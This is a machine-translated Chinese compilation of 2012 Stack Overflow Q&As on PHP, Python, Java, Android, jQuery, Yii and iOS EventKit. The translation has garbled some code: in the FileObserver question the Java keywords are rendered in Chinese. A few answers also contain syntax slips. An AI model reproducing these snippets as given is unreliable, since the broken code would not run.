给定上面的字符串，您可以创建局部变量`$status`并`$reason`使用[PHP 变量 variables](http://php.net/manual/en/language.variables.variable.php)。看看这段代码：

```
$str = 'status=2 reason=Invalid tariff/currency';

foreach (explode(' ', $str, 2) as $item) {
    list($key, $val) = explode('=', $item);
    $$key = $val;
}

// Now you have these
echo $status;  // 2
echo $reason;  // Invalid tariff/currency 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:22:38.950

大概是这样的吧？

```
$parts = explode(" ", $response['body'], 2);
foreach($parts as $part)
{
   $tmp = explode("=", $part);
   $data[$tmp[0]] = $tmp[1];
}

var_dump($data); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:29:39.247

试试这个，它只适用于你的例子，如果你有可能从不同格式中提取数据，我建议最好使用 preg_match。

```
$response['body'] = "status=2 reason=Invalid tariff/currency";
$responseArray = explode(" ", $response['body'], 2);
foreach($responseArray as $key => $value){
    $requiredOutput = explode("=",$value);
    print_r($requiredOutput);
} 
```

# combobox - 请解释 jquery 自动完成更改事件

> ID：10811673
> 
> 赞同：0
> 
> 时间：2012-05-30T07:18:27.227
> 
> 标签：combobox, jquery, jquery-autocomplete

关于 jquery 自动完成组合框，有人可以解释一下`change`事件是什么，什么时候会被触发？

来自官方文档：

> 当字段模糊时触发，如果值发生了变化；ui.item 是指选中的项目。

他们是什么意思`field is blurred`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:19:53.270

“模糊”是指“失去焦点”，例如您单击该字段，它获得焦点，然后您单击其他位置，该字段“模糊”。

[DOM 事件规范](http://www.w3.org/TR/DOM-Level-2-Events/events.html#Events-eventgroupings-htmlevents)说明了以下内容（添加了重点）：

> 当元素通过定点设备或标签导航**失去焦点时，会发生模糊事件。**此事件对以下元素有效：LABEL、INPUT、SELECT、TEXTAREA 和 BUTTON。

如果该字段的值已更改，则当字段失去焦点时会触发“更改”事件：

> 当控件失去输入焦点并且其值在获得焦点后已被修改时，会发生更改事件。此事件对 INPUT、SELECT 和 TEXTAREA 有效。元素。

# python - 在python中访问列表中的最后一个元素

> ID：10811679
> 
> 赞同：-4
> 
> 时间：2012-05-30T07:18:54.620
> 
> 标签：python, string, list

其实我有一个清单，例如

```
list_1 = ["hi","hello","nice"] 
```

**1.**现在我只需要访问列表的最后一个元素，并且列表中的元素不是固定的，我的意思是列表的长度会增加（有机会添加更多的字符串），无论列表中的元素是什么列表我只需要访问列表的最后一个元素。如果它是一个字符串，我们可以通过`slicing`来完成，但是如何使用列表
**2**来执行此操作。我只想删除列表中的最后一个元素，而与上述列表的长度无关。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:20:03.543

访问最后一个元素

```
>>> myl = [1,2,3]
>>> myl[-1]
3 
```

并删除看看

[list.pop([i])](http://docs.python.org/tutorial/datastructures.html#more-on-lists)

> 删除列表中给定位置的项目，并将其返回。如果未指定索引，a.pop() 将删除并返回列表中的最后一项。

# python - 无法从任何类中的析构函数调用函数

> ID：10811681
> 
> 赞同：3
> 
> 时间：2012-05-30T07:18:58.393
> 
> 标签：python

我想在一个类中使用 ConfigParser，它需要来自析构函数的调用，但随后发生了奇怪的事情。

这是我的代码：

```
"""
function name is 
test  ok!
test1 failed!
test2 failed!
test3 failed!

test4
...  ok!

"""

def test3():
  pass

class Class1:
  def __del__(self):
    test3()

if __name__=="__main__":
  obj=Class1() 
```

如果函数名为`test1`, `test2`or `test3`，则会引发异常，我无法通过`try except`.

回溯是：

```
E:\tc.py
Exception TypeError: "'NoneType' object is not callable" in <bound method Class1.__del__ of <__main__.Class1 instance at 0x00C18F58>> ignored 
```

太奇怪了！你能在你的系统中测试它吗？还是我做错了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-30T07:22:36.080

对象被销毁的顺序是不确定的。这意味着在`obj.__del__()`被调用时——如果它被调用——`test3()`可能已经被销毁，也可能没有被销毁。

[文档](http://docs.python.org/reference/datamodel.html#object.__del__)中有一个带有警告的红色框：

> **警告**由于`__del__()`调用方法的环境不稳定，因此在执行期间发生的异常将被忽略，`sys.stderr`而是打印一个警告。**此外，当`__del__()`响应于模块被删除而被调用时（例如，当程序执行完成时），该`__del__()`方法引用的其他全局变量可能已经被删除或正在被拆除（例如，导入机器关闭)** . 为此原因，`__del__()`方法应该做维护外部不变量所需的绝对最小值。从 1.5 版开始，Python 保证名称以下划线开头的全局变量会在其他全局变量被删除之前从其模块中删除；`__del__()`如果不存在对此类全局变量的其他引用，这可能有助于确保在调用方法时导入的模块仍然可用。

在 Python 中，几乎从不覆盖`__del__`. 您可能应该重新考虑您的设计。请参阅[如何正确清理 Python 对象？](https://stackoverflow.com/questions/865115/how-do-i-correctly-clean-up-a-python-object)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-30T07:21:43.343

你不能确定在调用`test3`的时候还没有被销毁`obj.__del__()`。`Class1.__init__()`如果您需要保留它，请添加对它的引用。

# extjs - 如何删除extjs的EXT.list.Listview中的最后一个空白行

> ID：10811682
> 
> 赞同：0
> 
> 时间：2012-05-30T07:18:59.310
> 
> 标签：extjs, extjs3

我正在使用 extjs 的 ListView 插入一个值列表，在创建列表之后，当我尝试修改列表视图时，我惊讶地看到最后添加到列表中的空白行。代码：

```
var listView = new Ext.list.ListView({
  id: "listView_values",
  autoScroll : true,
  height:80,
  reserveScrollOffset: true,
  hideHeaders : true,
  singleSelect : true,
  store: store,
  multiSelect: false,
  columns: [{
     dataIndex: 'value'
  }]
}); 
```

请帮助解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-04T04:21:46.577

在我的 java 类中添加这段代码后，我实现了上述功能。

```
lValuesList = lValuesList.substring(0, lValuesList.length() - 1); 
```

# java - FileObserver UnsatisfiedLinkError

> ID：10811683
> 
> 赞同：0
> 
> 时间：2012-05-30T07:19:04.107
> 
> 标签：java, android, file, java-native-interface

我正在尝试按照本教程[http://www.roman10.net/android-fileobserverthe-underlying-inotify-mechanism-and-an-example/](http://www.roman10.net/android-fileobserverthe-underlying-inotify-mechanism-and-an-example/)实现 FileObserver ，我从这样的服务（onCreate（））启动它：

```
FileObserver fo = new FileObserver("/sdcard", FileObserver.CREATE) {

 @覆盖
 公共无效onEvent（int事件，字符串路径）{
  Ll(路径 + "创建");
 }
};
fo.startWatching();

```

但我得到 java.lang.UnsatisfiedLinkError: init

谁能建议我应该如何设置 FileObserver？我没有使用过 JNI，也许我在那里遗漏了一些东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T13:48:52.177

没关系，事实证明我在尝试使用 FileObserver 的实际源代码并编译和运行它而不是使用框架中的 FileObserver 时犯了一个错误。我的错。

# drupal - Drupal 7 的付费会员

> ID：10811686
> 
> 赞同：2
> 
> 时间：2012-05-30T07:19:17.940
> 
> 标签：drupal, drupal-7, membership

我正在尝试找到在 Drupal 站点中进行付费会员的方法，例如，当我支付一些会员费时访问一些内容。我已经阅读了很多，但大多数示例都是针对 Drupal 6 或使用 moneyscripts.net 的。我还阅读了一些关于 ubercart、uc_recurring 等的教程，但没有一个能很好地工作。

有没有办法在 Drupal 7 中添加付费会员？也许有人可以给我一些方向，线程，教程等。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:04:54.147

我在 Drupal 论坛上问过，他们帮我解决了，这里是线程：[http](http://drupal.org/node/1607152) ://drupal.org/node/1607152 ，在这里你可以找到解决方案： http: [//drupal.org/node/1312418](http://drupal.org/node/1312418)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T16:19:00.380

我也在寻找解决方案。[Commerce 订阅产品](http://drupal.org/project/commerce_sp)看起来是最好的选择，但由于一些限制，我仍在研究选项并且尚未测试此解决方案：

*   此模块不实施定期支付解决方案和自动订阅续订。虽然这可以通过附加模块进行集成。
*   该模块仅在站点上提供一种订阅。如果需要多种订阅类型，那么理论上可以克隆（和重命名）模块及其配置。

# java - 如何在java中找到月份中的哪一天？

> ID：10811688
> 
> 赞同：-3
> 
> 时间：2012-05-30T07:19:27.860
> 
> 标签：java, date

这就是我在 java 中获取日期的方法：

```
Date date = (new GregorianCalendar(year,month - 1, i)).getTime(); // year,month,day
            SimpleDateFormat f = new SimpleDateFormat("EEEE");
            nameofday = f.format(date); 
```

当我打印日期对象时，它给了我如下答案：

```
Sun Apr 01 00:00:00 IST 2012
Mon Apr 02 00:00:00 IST 2012
Tue Apr 03 00:00:00 IST 2012
Wed Apr 04 00:00:00 IST 2012
Thu Apr 05 00:00:00 IST 2012
Fri Apr 06 00:00:00 IST 2012
Sat Apr 07 00:00:00 IST 2012 
```

从此我只想得到前一天：01,02,03,04,05等。

如何在java中做到这一点？

问候托尼

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T07:22:09.873

如果要将日期作为数字，请使用：

```
int dayOfMonth = gregorianCalendarInstance.get(Calendar.DATE); 
```

如果您想要一个类似 的字符串`"05"`，请将您的日期格式更改为`dd`，即：

```
SimpleDateFormat f = new SimpleDateFormat("dd"); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T07:29:12.377

您的输出不是`nameofday`. 如果您打印`nameofday`，它将打印“星期六”或“星期五”。如果您希望月份中有两个字符，如[SimpleDateFormat 的 javadoc 中](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)所示，则必须使用`"dd"`该模式：

```
Date date = ...
DateFormat df = new SimpleDateFormat("dd");
System.out.println(df.format(date)); 
```

你真的应该学会阅读文档。

# android - 在 Android 中获取 WiFi 代理设置

> ID：10811698
> 
> 赞同：14
> 
> 时间：2012-05-30T07:19:49.027
> 
> 标签：android, proxy, wifi

我正在尝试读取 WIFI 代理设置

*   代理主机
*   代理端口
*   代理用户（认证）
*   代理密码（认证）

从 android 版本 2.XX – 4.XX 的设备没有任何成功。

来电：

```
String proxy = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.HTTP_PROXY); 
```

始终返回 null。

我还添加到我的 android 清单中：

```
<uses-permission android:name="android.permission.WRITE_SETTINGS" />
<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" /> 
```

它仍然返回null。

也试过：

```
android.net.Proxy. getHost(Context ctx) – which is deprecated – returns the IP
android.net.Proxy. getPortt(Context ctx) – which is deprecated – returns always -1. 
```

Java 调用：

```
System.getProperty("http.proxyHost");
System.getProperty("http.proxyCall"); 
```

也返回 null。

是否有工作代码可以检索所有这些设置或至少部分从所有 android 版本的设备中检索？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-28T23:08:37.283

我找到了这个项目：[Android Proxy Library](http://code.google.com/p/android-proxy-library/) ，它提供了向后兼容的查询代理设置的方法，以及为旧版本的 Android 上的 WebView 设置它们。

```
 // Grab Proxy settings in a backwards compatible manner
    ProxyConfiguration proxyConfig = ProxySettings.getCurrentHttpProxyConfiguration( context );

    // Set Proxy for WebViews on older versions of Android
    ProxyUtils.setWebViewProxy( getActivity().getApplicationContext() ); 
```

但是，您需要了解有关在 WiFi AP 上设置的代理设置的一些信息。由于 WiFi 特定代理设置直到 3.1 才在 Android 中实现，所有暴露该功能的 3.1 之前的设备都在使用某种自定义黑客。它们不以任何标准方式工作。因此，像这样的库将无法从其中一个黑客中获取任何代理集。

然而，在 pre-3.1 中有一个系统范围的代理，这种库*将*抓住。当然，Android 认为不提供任何官方方式来修改此设置是合适的。但是 Play Store 上有一些应用程序可以让你这样做，这是我正在使用的：[代理设置](https://play.google.com/store/apps/details?id=com.lechucksoftware.proxy.proxysettings)，它运行良好，设置系统代理并允许你通过这个库获取它，甚至更简单查询 JVM 代理设置等方法。

我最终没有使用 APL，而是使用了一个更简单的实现：

```
 private static final boolean IS_ICS_OR_LATER = Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH;

    ...

    String proxyAddress;
    int proxyPort;

    if( IS_ICS_OR_LATER )
    {
        proxyAddress = System.getProperty( "http.proxyHost" );

        String portStr = System.getProperty( "http.proxyPort" );
        proxyPort = Integer.parseInt( ( portStr != null ? portStr : "-1" ) );
    }
    else
    {
        proxyAddress = android.net.Proxy.getHost( context );
        proxyPort = android.net.Proxy.getPort( context );
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-03-28T08:12:09.260

这就是我正在使用的：

```
public static String[] getUserProxy(Context context)
{
    Method method = null;
    try
    {
      method = ConnectivityManager.class.getMethod("getProxy");
    }
    catch (NoSuchMethodException e)
    {
      // Normal situation for pre-ICS devices
      return null;
    }
    catch (Exception e)
    {
      return null;
    }

    try
    {
      ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
      Object pp = method.invoke(connectivityManager);
      if (pp == null)
        return null;

      return getUserProxy(pp);
    }
    catch (Exception e)
    {
      return null;
    }
  }

private static String[] getUserProxy(Object pp) throws Exception
{
    String[] userProxy = new String[3];

    String className = "android.net.ProxyProperties";
    Class<?> c = Class.forName(className);
    Method method;

    method = c.getMethod("getHost");
    userProxy[0] = (String) method.invoke(pp);

    method = c.getMethod("getPort");
    userProxy[1] = String.valueOf((Integer) method.invoke(pp));

    method = c.getMethod("getExclusionList");
    userProxy[2] = (String) method.invoke(pp);

    if (userProxy[0] != null)
      return userProxy;
    else
      return null;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-04T12:30:40.193

以下是检索代理详细信息的代码片段

```
public static String getProxyDetails(Context context) {
        String proxyAddress = new String();
        try {
            if (IsPreIcs()) {
                proxyAddress = android.net.Proxy.getHost(context);
                if (proxyAddress == null || proxyAddress.equals("")) {
                    return proxyAddress;
                }
                proxyAddress += ":" + android.net.Proxy.getPort(context);
            } else {
                proxyAddress = System.getProperty("http.proxyHost");
                proxyAddress += ":" + System.getProperty("http.proxyPort");
            }
        } catch (Exception ex) {
            //ignore
        }
        return proxyAddress;
    } 
```

如果检测到某些异常或未检测到代理，它将返回 enmpty；

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-01-04T10:50:15.370

```
private fun getUserProxy(context: Context): Data {
    return try {
        val declaredField = WifiConfiguration::class.java.getDeclaredField("mIpConfiguration")
        declaredField.isAccessible = true

        val data =
            (context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager)
                ?.configuredNetworks
                ?.asSequence()
                ?.mapNotNull {
                    try {
                        declaredField.get(it)
                    } catch (e: Exception) {
                        e.printStackTrace()
                        null
                    }
                }
                ?.mapNotNull {
                    try {
                        (it.javaClass.getDeclaredField("httpProxy").get(it) as? ProxyInfo)
                    } catch (e: Exception) {
                        e.printStackTrace()
                        null
                    }
                }
                ?.find { !it.host.isNullOrEmpty() }
                ?.let { Data(it.host ?: "", it.port.toString()) }
                ?: Data()

        declaredField.isAccessible = false
        return data
    } catch (e: Exception) {
        e.printStackTrace()
        Data()
    }
}

data class Data(
    val host: String = "",
    val port: String = ""
) 
```

# php - 警告：当我使用标头时 php 中的消息（'位置：index.php）？

> ID：10811710
> 
> 赞同：-4
> 
> 时间：2012-05-30T07:20:49.787
> 
> 标签：php, header, location, warnings

> **可能重复：**
> [PHP 已发送的标头](https://stackoverflow.com/questions/8028957/headers-already-sent-by-php)

当我在 php 代码中使用 header('Location: index.php) 时，它会显示此错误消息。

**警告：无法修改标头信息 - 标头已由 D:\xampp\htdocs\OnlineCode\online\survey\ 中的（输出开始于 D:\xampp\htdocs\OnlineCode\online\survey\code\index.php:55）发送第 62 行的 code\index.php**

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:32:57.213

确保在重定向标头之前没有 echo 或 print 语句。当我们在重定向标头之前使用 echo 或 print 时会导致此错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:22:29.900

这发生在输出已经开始时。您必须在任何输出发生之前进行 header() 调用。甚至 php 标签之外的空格也算作输出。将页面代码发布在我们可以查看的地方可能会有所帮助。

# excel - 将范围变量传递给 Excel 宏中的公式

> ID：10811719
> 
> 赞同：2
> 
> 时间：2012-05-30T07:21:48.950
> 
> 标签：excel, excel-2007, vba

我试图在宏公式中使用变量以避免选择单元格，但是我不断收到错误消息。

这是我尝试做的事情的简化：

```
 Dim myRange as Range
    Dim formulaCell as Range

    Set myRange = [a1:a10]
    formulaCell.Formula = "=sum(myRange)" 
```

但是我不断得到：

```
"application-defined or object defined error" 
```

我试过使用：

```
formulaCell.Formula = "=sum(" & myRange & ")" 
```

但后来我得到：

```
Type mismatch 
```

也试过：

```
formulaCell.Formula = "=sum(" & Range(myRange) & ")" 
```

无济于事

我确定答案是非常基本的，但无法弄清楚我做错了什么。任何和所有的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T07:54:35.400

首先，您必须设置`formulaCell`为引用范围。然后使用下一个字符串而不是你的

```
formulaCell.Formula = "=sum(" & myRange.Address & ")" 
```

# python - Python：使用 Reportlab Canvas 以 PDF 格式打印 Html

> ID：10811720
> 
> 赞同：3
> 
> 时间：2012-05-30T07:21:50.400
> 
> 标签：python, pdf-generation, reportlab

对于我的一个 python 项目，我正在使用 reportlab 的画布功能生成 pdf 文档。

谁能帮我在reportlab画布上打印一小部分html（p、strong、ul、ol、li、img、对齐）？

提前致谢...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-31T02:18:35.393

如果这是您想做的事情，您应该考虑将 Platypus 与 ReportLab 结合使用，这是 ReportLab 中的一组内置类，用于从表示页面元素的对象构建文档。或者，如果您想要非常简单，xhtml2pdf 可能会更好。

# php - 根据某些条件在菜单中提供链接

> ID：10811721
> 
> 赞同：1
> 
> 时间：2012-05-30T07:21:53.187
> 
> 标签：php, yii

我这里有个情况。在我的项目中，菜单部分包含一些锚标签，当我们在索引页面中时它会完美工作，但是移动到其他页面我想在那里提供真正的链接，所以我的问题是如何检查正在查看的页面或如何检查站点查看器不在索引页面中

```
<li><a href="#home" class="active">Home</a></li>
<li><a href="#about_us">About Us</a></li> 
```

我想`href`有条件地改变，例如当我在索引时上面的`href`属性是好的，当我在另一个页面时，例如注册，那么`href`属性改变为`index.php/site/index#home`

提前致谢

**更新：** 谢谢[uttara](https://stackoverflow.com/a/10811838/1343222)，我在她的帮助下找到了解决方案

```
<?php
$url = $_SERVER["REQUEST_URI"];
$page = pathinfo($url);
$filename = $page['filename'];
$href = ($filename=='root_directory' || $filename=='index'  || $filename=='site')?'':Yii::app()->request->baseUrl;
?>
<a href="<?php echo $href ; ?>#home" class="active">Home</a> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:32:24.887

您可以使用[CMenu](http://www.yiiframework.com/doc/api/1.1/CMenu)小部件，它负责处理高光、外观等。此外，您之后还可以使用自定义 CSS。

```
<?php 
    $this->widget('zii.widgets.CMenu',array(
        'items'=>array(
            array('label'=>'Home', 'url'=> 'YOUR_URL#home'),
            array('label'=>'About Us', 'url'=>'YOUR_URL#about_us)'
        )
       ); 
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:30:19.910

```
$url = $_SERVER["REQUEST_URI"];
$page = pathinfo($url);
$filename = $page['filename']; 
```

`$filename`将为您提供正在查看的当前页面的名称

你可以检查

```
if($filename != 'index')
{
    echo '<li><a href="index.php/site/index#home" class="active">Home</a></li>
          <li><a href="#about_us">About Us</a></li>';
}
else
{
    echo '<li><a href="#home" class="active">Home</a></li>
              <li><a href="#about_us">About Us</a></li>';
} 
```

记住`$filename`只给你没有扩展名的文件名

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:34:29.710

首先将 id 提供给锚标签，然后将条件如下所示

```
 <?php 
// the php code
   $flag=strpos('index.php',$_SERVER['PHP_SELF'])
   {
  ?>
   <script>
           $(document).ready(function(){
                       $("#idofanchortg").attr('href','hrefyou want to add');
           });

   </script>
<?php } ?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:36:12.670

您可以使用 Yii [http://www.yiiframework.com/wiki/211/creating-a-css-driven-drop-down-menu-using-cmenu/提供的 CMenu 小部件](http://www.yiiframework.com/wiki/211/creating-a-css-driven-drop-down-menu-using-cmenu/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-30T09:21:49.610

首先，我更愿意将责任留在一个地方。

```
<li><a href="<?php echo $this->getHomeHrefLink(); ?>" class="active">Home</a></li>
<li><a href="#about_us">About Us</a></li> 
```

我更喜欢这种方式，因为代码更干净。好。现在我们知道我们所有的控制器都扩展了 Controller 类（/protected/components/Controller.php）。在这个地方我们可以添加

```
public function getHomeHrefLink() {
    // when I'm in index page the href attribute is #home
    // when I'm in register page the href attribute is index.php/site/index#home
} 
```

所以来吧：我们可以通过 $this->action（用于控制器名称）和 $this->action->id（用于操作名称）来了解我们在哪里：

```
public function getHomeHrefLink() {
    return $this->createUrl('index/site', array());

    // when I'm in register page the href attribute is index.php/site/index#home
    return '#home;
} 
```

# iphone - EKEventStore removeEvent EKErrorDomain 代码=11 EKErrorObjectBelongsToDifferentStore

> ID：10811726
> 
> 赞同：2
> 
> 时间：2012-05-30T07:22:13.617
> 
> 标签：iphone, ios, ios5, eventkit, ekevent

我收到一个错误：

**删除事件错误：Error Domain=EKErrorDomain Code=11“该事件不属于该事件存储。” UserInfo=0x1fdf96b0 {NSLocalizedDescription=该事件不属于该事件存储。**

当我尝试删除我刚刚创建的 EKEvent 时。

下面的代码显示我正在存储 eventIdentifier 并使用它来检索事件。此外，当我这样做时，NSLog 事件我可以正确地看到它的所有属性。

从我看到的所有例子中，我做的一切都是正确的。我还对 EKEventStore 的 eventStoreIdentifier 进行了 NSLog 处理，并且每次我在任何方法中访问它时它都是相同的，因此它应该是相同的 EKEventStore。

任何帮助将不胜感激。

```
- (EKEvent *) getCurrentCalendarEvent {
    NSString *currentCalendarEventID = [[UserModel sharedManager] currentCalendarEventID];
    EKEventStore *eventStore = [[EKEventStore alloc] init];
    EKEvent *event = [eventStore eventWithIdentifier:currentCalendarEventID];
    return event;
}

- (void) removeCurrentCalendarEvent {
    EKEvent *event = [self getCurrentCalendarEvent];
    if (event) {
        NSError *error;
        EKEventStore *eventStore = [[EKEventStore alloc] init];
        [eventStore removeEvent:event span:EKSpanFutureEvents error:&error];
    }
}

- (void) addCurrentCalendarEvent {
    [self removeCurrentCalendarEvent];

    EKEventStore *eventStore = [[EKEventStore alloc] init];
    EKEvent *event = [EKEvent eventWithEventStore:eventStore];
    event.title = [[UserModel sharedManager] reminderLabel];
    event.notes = @"Notes";

    NSDate *startDate = [NSDate date];
    int futureDateSecs = 60 * 5;
    NSDate *endDate = [startDate dateByAddingTimeInterval:futureDateSecs];

    event.startDate = startDate;
    event.endDate = endDate;

    [event setCalendar:[eventStore defaultCalendarForNewEvents]];

    NSError *error;
    [eventStore saveEvent:event span:EKSpanThisEvent error:&error];

    [[UserModel sharedManager] setCurrentCalendarEventID:event.eventIdentifier];
    [[UserModel sharedManager] saveToDefaults];
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-30T07:38:24.847

这是因为你是`always initializing a new instance of EKEventStore`。当您添加`EKEvent`时`EKEventStore`，实例与`EKEventStore`您尝试删除时不同。您可以做的是`EKEventStore`在 .h 中声明引用变量并仅对其进行一次初始化。

在.h -

```
EKEventStore *eventStore; 
```

在.m -

里面`viewDidLoad`——

```
eventStore = [[EKEventStore alloc] init]; 
```

然后从所有三种方法中删除此行-

```
EKEventStore *eventStore = [[EKEventStore alloc] init]; 
```

# java - 如何从 android 上的外部存储打开 .gif 文件作为 InputStream

> ID：10811730
> 
> 赞同：4
> 
> 时间：2012-05-30T07:22:30.133
> 
> 标签：java, android, android-emulator

我正在尝试从外部存储（图片目录）加载 .gif 图像，但我使用以下代码得到**“找不到文件异常” 。**

```
 InputStream mInputStream = null;
    AssetManager assetManager = getResources().getAssets();
    try {
        mInputStream = assetManager.open(getExternalFilesDir(Environment.DIRECTORY_PICTURES).getAbsolutePath().concat("/01.gif"));          

    } catch (IOException e) {           
        e.printStackTrace();
    } 
```

我也使用手动路径进行了测试，但遇到了同样的异常

```
mInputStream = assetManager.open("file:///mnt/sdcard/Android/data/com.shurjo.downloader/files/Pictures/01.gif"); 
```

清单文件中有 SD 卡的写/读权限

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

请帮助我如何从外部存储打开文件作为 InputStream。提前致谢。

**注意：**我在模拟器上测试过，图片文件夹下有一个文件01.gif（请看手册路径）。我可以创建目录并将文件放在这些目录中，但无法通过输入流访问这些文件。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-30T07:26:31.763

[`AssetManager`](http://developer.android.com/reference/android/content/res/AssetManager.html)用于访问应用程序包的*assets文件夹中的文件。*它不能用于访问外部存储中的文件。

您可以使用以下内容：

```
final String TAG = "MyAppTag";

File picturesDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
File imageFile = null;
final int readLimit = 16 * 1024;
if(picturesDir != null){
    imageFile = new File(picturesDir, "01.gif");
} else {
    Log.w(TAG, "DIRECTORY_PICTURES is not available!");
}
if(imageFile != null){
    mInputStream =  new BufferedInputStream(new FileInputStream(imageFile), readLimit);
    mInputStream.mark(readLimit);
} else {
    Log.w(TAG, "GIF image is not available!");
} 
```

另请查看可用的示例代码[`getExternalFilesDir`](http://developer.android.com/reference/android/content/Context.html#getExternalFilesDir%28java.lang.String%29)

更新自：[这个](https://stackoverflow.com/q/10240042/1321873)

# android - WebView中的html5，检测视频何时启动

> ID：10811748
> 
> 赞同：2
> 
> 时间：2012-05-30T07:24:16.643
> 
> 标签：android

在 a`WebView`中，我正在尝试加载嵌入 a 的 html5 页面，`<video>`但是有什么方法可以检测到用户何时选择播放按钮或视频开始播放？

现在是当我播放视频时，默认是触发一个`Intent`打开Android的默认播放器，我不希望它触发一个Intent，我想使用一个`Dialog`并在那里播放。如果有人可以给出一个想法。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2019-03-05T20:15:28.867

```
@Override
public void onCreate(Bundle savedInstanceState) {
    ....
    mywebviewer = (WebView) findViewById(R.id.mywebviewer);
    WebSettings webSettings = mywebviewer.getSettings();
    webSettings.setJavaScriptEnabled(true);
    mywebviewer.loadUrl("https://www.youtube.com");
    mywebviewer.setWebViewClient(new WebViewClient());
}

@Override
public void onBackPressed() {
    if (mywebviewer.canGoBack()) {
          mywebviewer.goBack();
    } else {
        super.onBackPressed();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-06-06T18:56:10.283

我这样做：

```
 boolean videoPlay=false;
 webView.setWebChromeClient(new WebChromeClient() {
    @Override
    public Bitmap getDefaultVideoPoster() {
       super.getDefaultVideoPoster();
       videoPlay=true; 
       Log.d("vplayyyyyyyy",String.valueOf(videoPlay));
       return null;
    }
 }); 
```

希望这有帮助:)

# encoding - 将 ms word 文档的特殊字符转换为 html

> ID：10811758
> 
> 赞同：3
> 
> 时间：2012-05-30T07:25:14.363
> 
> 标签：encoding

我有使用 Apache POI Api 将 doc 转换为 html 的 word 文档和以下代码。

```
 serializer.setOutputProperty(OutputKeys.ENCODING, "UTF-8");

   serializer.setOutputProperty(OutputKeys.METHOD, "html");

   serializer.transform(domSource, streamResult); 
```

但是编号 ie 1)、a)、i) 等和项目符号字符没有被正确解析，我得到像 1 这样的垃圾字符？当我在编辑器中打开 html 文件时，我得到带有不需要的框的数字。我已经尝试了很多，但我没有得到适当的解决方案。

请帮我解决这个编码问题。

谢谢

# slickgrid - SlickGrid拖放事件问题

> ID：10811763
> 
> 赞同：0
> 
> 时间：2012-05-30T07:25:28.707
> 
> 标签：slickgrid

我不知道这是否与 SlickGrid 或 jquery.event.drop 库有关，但我的问题是，尽管我从网格中拖动并拖放到某些元素上有效，但我无法使用“dropstart”事件。当拖动的元素接触到它时，我很想突出显示可放置的元素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T13:50:00.420

为什么不根据需要使用 droppable 元素的 hoverClass 属性来突出显示 droppable 呢？[http://jqueryui.com/demos/droppable/#visual-feedback](http://jqueryui.com/demos/droppable/#visual-feedback)

也许在这里发布一些代码或发布小提琴以更清楚地说明这个问题。

# php - php代码获取时区和当前系统时间与GMT的差异

> ID：10811764
> 
> 赞同：0
> 
> 时间：2012-05-30T07:25:30.100
> 
> 标签：php, javascript

请帮助我使用 php 代码获取时区以及当前系统时间与伦敦时间的差异我需要获取发送邮件的时区。之后我需要获取当前系统时间以及php中当前系统时间的GMT差异

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:32:38.977

获取当前系统时区偏移量获取伦敦时区偏移量（从邮件发送）伦敦时区： date_default_timezone_set('Europe/London');

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:28:55.527

PHP是服务器端的，调用`date()`会给出服务器的时间。

您可以传递不同的参数来`date()`获取您需要的信息。`date('Z')`将以秒为单位为您提供时区偏移量（与 UTC/GMT 的偏移量）。您也可以使用`date('P')`.

要获取本地机器的时区，您必须使用客户端的东西，例如 Javascript。您可以使用[jsTimezoneDetect](http://www.pageloom.com/automatic-timezone-detection-with-javascript)来执行此操作。

让 Javascript 访问服务器日期，并比较两个日期：

```
var server_date = new Date(<?= date("YYYY-MM-DD") ?>);
var local_date = new Date(); 
```

您需要`YYYY-MM-DD`用更合适的时间和日期格式字符串替换。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:33:01.413

这个[博客](http://ditio.net/2008/06/03/php-datetime-and-datetimezone-tutorial/)和[这个 PHP 类](http://in.php.net/manual/en/class.datetimezone.php)应该足以满足您的需求

* * *

## 回答 #4

